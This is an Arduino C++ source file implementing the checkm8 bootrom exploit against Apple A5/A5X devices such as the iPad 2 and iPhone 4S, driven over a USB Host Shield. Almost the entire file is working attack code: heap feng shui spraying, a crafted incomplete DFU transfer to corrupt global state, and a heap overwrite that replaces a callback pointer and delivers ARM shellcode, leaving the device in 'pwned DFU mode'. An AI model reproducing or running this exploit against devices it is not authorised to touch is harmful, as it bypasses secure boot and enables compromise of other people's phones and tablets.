/**
 * checkm8-a5: checkm8 exploit for Apple A5/A5X SoCs
 * 
 * This is an Arduino implementation of the checkm8 bootrom exploit for devices
 * with S5L8940X/S5L8942X/S5L8945X SoCs (iPad 2, iPhone 4S, etc.)
 * 
 * Hardware Requirements:
 * - Arduino board (Uno, Mega, etc.)
 * - MAX3421E USB Host Shield
 * - Target device in DFU mode
 * - Standard USB cable (no hubs!)
 * 
 * IMPORTANT WARNINGS:
 * ⚠️  This exploit DEMOTES your device by default, enabling SWD debugging
 * ⚠️  Demoted devices use development KBAG for Image3 decryption
 * ⚠️  Do NOT use cables with embedded USB hubs (DCSD/Kong/Kanzi/etc.)
 * ⚠️  Ensure you understand the implications before proceeding
 * 
 * Authors: a1exdandy, nyan_satan
 * License: MIT
 * Based on: checkm8 by axi0mX
 */

#include "Usb.h"
#include "src/config/error_codes.h"
#include "src/config/constants_named.h"

// ============================================================================
// SOC SELECTION - CHANGE THIS TO MATCH YOUR TARGET DEVICE
// ============================================================================
// Uncomment ONE of the following lines for your target SoC:

#define A5_8942  // iPad 2 (WiFi, GSM, CDMA Rev A), iPhone 4S
// #define A5_8945  // iPad 2 (WiFi Rev A, 3rd gen), iPad Mini (1st gen), Apple TV 3
// #define A5_8940  // iPad 2 (original)

#include "constants.h"  // SoC-specific payloads and padding

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

USB Usb;
USB_DEVICE_DESCRIPTOR desc_buf;
uint8_t rcode;
uint8_t last_state, state;
bool is_apple_dfu = false;
uint8_t serial_idx = 0xff;

/** Current exploit stage */
enum {
  CHECKM8_INIT_RESET,
  CHECKM8_HEAP_FENG_SHUI,
  CHECKM8_SET_GLOBAL_STATE,
  CHECKM8_HEAP_OCCUPATION,
  CHECKM8_END
};
uint8_t checkm8_state = CHECKM8_INIT_RESET;

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * Send OUT packet to USB device
 * @param io_buf Buffer containing data to send
 * @param pktsize Size of packet to send
 * @return USB error code (0 = success)
 */
uint8_t send_out(uint8_t * io_buf, uint8_t pktsize)
{
  Usb.bytesWr(rSNDFIFO, pktsize, io_buf);
  Usb.regWr(rSNDBC, pktsize);
  Usb.regWr(rHXFR, tokOUT);
  while(!(Usb.regRd(rHIRQ) & bmHXFRDNIRQ));
  Usb.regWr(rHIRQ, bmHXFRDNIRQ);
  uint8_t rcode = Usb.regRd(rHRSL) & 0x0f;
  return rcode;
}

/**
 * Print current exploit stage
 */
void printStage() {
  char buffer[32];
  Serial.print("Stage ");
  Serial.print(checkm8_state);
  Serial.print(": ");
  strcpy_P(buffer, (char*)pgm_read_word(&(STAGE_NAMES[checkm8_state])));
  Serial.println(buffer);
}

/**
 * Blink LED to indicate status
 * @param times Number of times to blink
 */
void blinkLED(int times) {
  for(int i = 0; i < times; i++) {
    digitalWrite(LED_STATUS_PIN, HIGH);
    delay(LED_BLINK_DELAY);
    digitalWrite(LED_STATUS_PIN, LOW);
    delay(LED_BLINK_DELAY);
  }
}

// ============================================================================
// EXPLOIT FUNCTIONS
// ============================================================================

/**
 * Perform heap feng shui request
 * Sends GET_DESCRIPTOR request to manipulate heap layout
 * 
 * @param sz Size of descriptor to request
 * @param intok Whether to read response with IN token
 * @return USB error code
 */
uint8_t heap_feng_shui_req(uint8_t sz, bool intok)
{
  uint8_t setup_rcode, data_rcode;
  
  // Request string descriptor (serial number)
  setup_rcode = Usb.ctrlReq_SETUP(0, 0, 0x80, USB_REQ_GET_DESCRIPTOR, 
                                   serial_idx, USB_DESC_STRING, 
                                   USB_LANGID_EN_US, sz);
  uint8_t io_buf[USB_PACKET_SIZE];

  if(intok) {
    data_rcode = Usb.dispatchPkt(tokIN, 0, 0);
    uint8_t pktsize = Usb.regRd(rRCVBC);
    Usb.bytesRd(rRCVFIFO, pktsize, io_buf);
    Usb.regWr(rHIRQ, bmRCVDAVIRQ);
  }
  
  Serial.print("  heap_feng_shui_req(sz=0x");
  Serial.print(sz, HEX);
  Serial.print("): setup=0x");
  Serial.print(setup_rcode, HEX);
  Serial.print(", data=0x");
  Serial.println(data_rcode, HEX);
  
  return setup_rcode;
}

/**
 * Stage 1: Heap Feng Shui
 * Manipulates heap layout to create exploitable conditions
 * 
 * This stage:
 * 1. Stalls endpoint to trigger specific error handling
 * 2. Performs 620 heap spray iterations to fragment heap
 * 3. Creates specific heap layout needed for exploitation
 */
void heap_feng_shui()
{
  Serial.println("\n=== STAGE 1: HEAP FENG SHUI ===");
  
  // Stall endpoint to trigger error handling path
  rcode = Usb.ctrlReq(0, 0, 2, DFU_REQUEST_GETSTATUS, 0, 0, 0x80, 0, 0, 0, 0);
  Serial.print("Endpoint stall: 0x");
  Serial.println(rcode, HEX);
  
  // Set receive toggle for proper USB state
  Usb.regWr(rHCTL, bmRCVTOG1);
  
  // Perform heap spray iterations
  Serial.print("Performing ");
  Serial.print(HEAP_SPRAY_ITERATIONS);
  Serial.println(" heap spray iterations...");
  
  int success = 0;
  while(success != HEAP_SPRAY_ITERATIONS) {
    if(heap_feng_shui_req(HEAP_SPRAY_SIZE, true) == 0) {
      success++;
      if(success % 100 == 0) {
        Serial.print("  Progress: ");
        Serial.print(success);
        Serial.print("/");
        Serial.println(HEAP_SPRAY_ITERATIONS);
      }
    }
  }
  
  // Final request to complete heap layout
  heap_feng_shui_req(HEAP_LEAK_SIZE, true);
  
  Serial.println("Heap feng shui complete!");
}

/**
 * Stage 2: Set Global State
 * Sets up global USB state for exploitation
 * 
 * This stage exploits the difference in HOST2DEVICE control request
 * processing between newer and A5/A5X SoCs to set up exploitable
 * global state without triggering zero-length packet reset.
 */
void set_global_state()
{
  Serial.println("\n=== STAGE 2: SET GLOBAL STATE ===");
  
  uint8_t tmpbuf[USB_PACKET_SIZE];
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));

  // Send DFU_DNLOAD request with data
  Serial.println("Sending DFU_DNLOAD setup...");
  rcode = Usb.ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                             0, 0, 0, USB_PACKET_SIZE);
  
  // Send pre-packet
  rcode = send_out(tmpbuf, USB_PACKET_SIZE);
  Serial.print("  OUT pre-packet: 0x");
  Serial.println(rcode, HEX);
  
  // Send data packet
  rcode = send_out(tmpbuf, USB_PACKET_SIZE);
  Serial.print("  OUT data packet: 0x");
  Serial.println(rcode, HEX);
  
  // Handshake
  rcode = Usb.dispatchPkt(tokINHS, 0, 0);
  Serial.print("  IN handshake: 0x");
  Serial.println(rcode, HEX);

  // Send zero-length packet (triggers different behavior on A5/A5X)
  Serial.println("Sending zero-length packet...");
  rcode = Usb.ctrlReq(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                      0, 0, 0, 0, 0, 0, 0);
  Serial.print("  Result: 0x");
  Serial.println(rcode, HEX);

  // Get status twice (required for exploit)
  Serial.println("Getting DFU status (x2)...");
  rcode = Usb.ctrlReq(0, 0, DFU_REQUEST_TYPE_D2H, DFU_REQUEST_GETSTATUS, 
                      0, 0, 0, DFU_STATUS_SIZE, DFU_STATUS_SIZE, tmpbuf, 0);
  Serial.print("  Status #1: 0x");
  Serial.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, DFU_REQUEST_TYPE_D2H, DFU_REQUEST_GETSTATUS, 
                      0, 0, 0, DFU_STATUS_SIZE, DFU_STATUS_SIZE, tmpbuf, 0);
  Serial.print("  Status #2: 0x");
  Serial.println(rcode, HEX);
  
  // Send incomplete control transfer to set global state
  Serial.print("Sending incomplete transfer (padding + 0x40 = 0x");
  Serial.print(padding + USB_PACKET_SIZE, HEX);
  Serial.println(" bytes)...");
  
  rcode = Usb.ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                             0, 0, 0, padding + USB_PACKET_SIZE);
  
  uint8_t io_buf[USB_PACKET_SIZE];
  for(int i = 0; i < ((padding + USB_PACKET_SIZE) / USB_PACKET_SIZE); i++) {
    rcode = send_out(io_buf, USB_PACKET_SIZE);
    Serial.print("  Packet ");
    Serial.print(i + 1);
    Serial.print(": 0x");
    Serial.println(rcode, HEX);
    
    if(rcode) {
      Serial.println("ERROR: Sending failed!");
      printError(ERR_STATE_SETUP_FAILED);
      checkm8_state = CHECKM8_END;
      return;
    }
  }
  
  Serial.println("Global state setup complete!");
}

/**
 * Stage 3: Heap Occupation
 * Overwrites freed heap memory and delivers payload
 * 
 * This stage:
 * 1. Triggers heap occupation
 * 2. Overwrites callback pointer in freed memory
 * 3. Delivers ARM shellcode payload
 * 4. Triggers payload execution
 */
void heap_occupation()
{
  Serial.println("\n=== STAGE 3: HEAP OCCUPATION ===");

  // Set receive toggle
  Usb.regWr(rHCTL, bmRCVTOG1);
  heap_feng_shui_req(HEAP_LEAK_SIZE, true);

  uint8_t tmpbuf[USB_PACKET_SIZE];

  // Send overwrite data
  Serial.println("Sending overwrite data...");
  rcode = Usb.ctrlReq_SETUP(0, 0, 0, 0, 0, 0, 0, USB_PACKET_SIZE);
  Serial.print("  SETUP: 0x");
  Serial.println(rcode, HEX);
  
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, USB_PACKET_SIZE);
  Serial.print("  OUT (pre-packet): 0x");
  Serial.println(rcode, HEX);
  
  // Send actual overwrite payload
  for(int i = 0; i < USB_PACKET_SIZE; i++)
    tmpbuf[i] = pgm_read_byte(overwrite + i);
  rcode = send_out(tmpbuf, USB_PACKET_SIZE);
  Serial.print("  OUT (overwrite): 0x");
  Serial.println(rcode, HEX);

  // Send ARM shellcode payload
  Serial.print("Sending payload (");
  Serial.print(sizeof(payload));
  Serial.println(" bytes)...");
  
  rcode = Usb.ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                             0, 0, 0, sizeof(payload));
  Serial.print("  SETUP: 0x");
  Serial.println(rcode, HEX);
  
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, USB_PACKET_SIZE);
  Serial.print("  OUT (pre-packet): 0x");
  Serial.println(rcode, HEX);
  
  // Send payload in 64-byte chunks
  for(int i = 0; i < sizeof(payload); i += USB_PACKET_SIZE) {
    for(int j = 0; j < USB_PACKET_SIZE; j++)
      tmpbuf[j] = pgm_read_byte(payload + i + j); 
    rcode = send_out(tmpbuf, USB_PACKET_SIZE);
    Serial.print("  Payload packet ");
    Serial.print((i / USB_PACKET_SIZE) + 1);
    Serial.print(": 0x");
    Serial.println(rcode, HEX);
  }
  
  Serial.println("Heap occupation complete!");
}

// ============================================================================
// ARDUINO SETUP AND MAIN LOOP
// ============================================================================

void setup() {
  Serial.begin(115200);
  
  // Print banner
  Serial.println("\n" + String('=', 60));
  Serial.println("  checkm8-a5: Bootrom Exploit for Apple A5/A5X SoCs");
  Serial.println(String('=', 60));
  
  // Print target SoC
  Serial.print("Target SoC: ");
  #if defined(A5_8942)
    Serial.println("S5L8942X (iPad 2, iPhone 4S)");
  #elif defined(A5_8945)
    Serial.println("S5L8945X (iPad 2 Rev A, iPad Mini, Apple TV 3)");
  #elif defined(A5_8940)
    Serial.println("S5L8940X (iPad 2 original)");
  #else
    Serial.println("ERROR: No SoC defined!");
    while(1);
  #endif
  
  // Print warnings
  Serial.println("\n⚠️  WARNING: This exploit will DEMOTE your device!");
  Serial.println("⚠️  Demoted devices use development KBAG for decryption");
  Serial.println("⚠️  Do NOT use cables with embedded USB hubs");
  Serial.println("⚠️  Ensure you understand the implications\n");
  
  // Initialize LED
  pinMode(LED_STATUS_PIN, OUTPUT);
  digitalWrite(LED_STATUS_PIN, LOW);
  
  // Initialize USB
  Serial.println("Initializing USB Host Shield...");
  if(Usb.Init() == -1) {
    printError(ERR_USB_INIT_FAILED);
    while(1) {
      blinkLED(1);
      delay(1000);
    }
  }
  
  Serial.println("USB initialized successfully!");
  Serial.println("Waiting for device in DFU mode...\n");
  
  delay(USB_INIT_DELAY);
}

void loop() {
  Usb.Task();
  state = Usb.getUsbTaskState();
  
  // State change detection
  if(state != last_state) {
    last_state = state;
  }
  
  // Handle USB errors
  if(state == USB_STATE_ERROR) {
    Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
  }
  
  // Main exploit logic when device is connected
  if(state == USB_STATE_RUNNING) {
    // Verify device is Apple DFU
    if(!is_apple_dfu) {
      Usb.getDevDescr(0, 0, 0x12, (uint8_t *) &desc_buf);
      
      if(desc_buf.idVendor != APPLE_VENDOR_ID || 
         desc_buf.idProduct != APPLE_DFU_PRODUCT_ID) {
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        
        if(checkm8_state != CHECKM8_END) {
          Serial.print("Non-Apple DFU device detected (VID:PID = ");
          Serial.print(desc_buf.idVendor, HEX);
          Serial.print(":");
          Serial.print(desc_buf.idProduct, HEX);
          Serial.println(")");
          Serial.println("Waiting for Apple DFU device...\n");
          delay(WRONG_DEVICE_DELAY);
        }
        return;
      }
      
      is_apple_dfu = true;
      serial_idx = desc_buf.iSerialNumber;
      Serial.println("✓ Apple DFU device detected!");
      Serial.print("Serial descriptor index: ");
      Serial.println(serial_idx);
    }

    // Execute exploit stages
    switch(checkm8_state) {
      case CHECKM8_INIT_RESET:
        printStage();
        blinkLED(LED_BLINKS_START);
        checkm8_state = CHECKM8_HEAP_FENG_SHUI;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
        
      case CHECKM8_HEAP_FENG_SHUI:
        printStage();
        heap_feng_shui();
        checkm8_state = CHECKM8_SET_GLOBAL_STATE;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
        
      case CHECKM8_SET_GLOBAL_STATE:
        printStage();
        set_global_state();
        checkm8_state = CHECKM8_HEAP_OCCUPATION;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
        
      case CHECKM8_HEAP_OCCUPATION:
        printStage();
        heap_occupation();
        checkm8_state = CHECKM8_END;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
        
      case CHECKM8_END:
        digitalWrite(LED_STATUS_PIN, HIGH);
        Serial.println("\n" + String('=', 60));
        Serial.println("  ✓ EXPLOIT COMPLETE!");
        Serial.println(String('=', 60));
        Serial.println("\nDevice should now be in pwned DFU mode.");
        Serial.println("You can now use tools like irecovery to interact with it.");
        checkm8_state = -1;  // Prevent re-execution
        break;
    }
  }
}
